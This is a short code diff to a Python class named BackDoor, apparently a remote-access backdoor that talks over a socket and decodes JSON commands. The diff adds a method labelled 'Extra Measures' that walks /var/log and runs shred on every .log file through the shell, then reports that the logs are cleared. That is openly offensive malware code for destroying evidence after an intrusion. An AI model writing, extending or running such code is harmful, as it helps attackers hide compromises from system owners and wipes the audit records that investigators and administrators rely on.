@@ -80,6 +80,14 @@ class BackDoor:
         return
     def close(self):
         self.__sock.close()
+    def deleteEV(self):
+        ''' Extra Measures '''
+        for i in os.listdir('/var/log'):
+            exts=os.path.splitext(i);
+            if '.log' in exts:
+                subprocess.call(f'shred -n 15 {os.path.join("/var/log/",i)}',shell=True)
+        print('[+] logs are cleared ')
+        return ;
     def __rec(self,code=4096):
         res=self.__sock.recv(code)
         result=json.loads(res.decode())
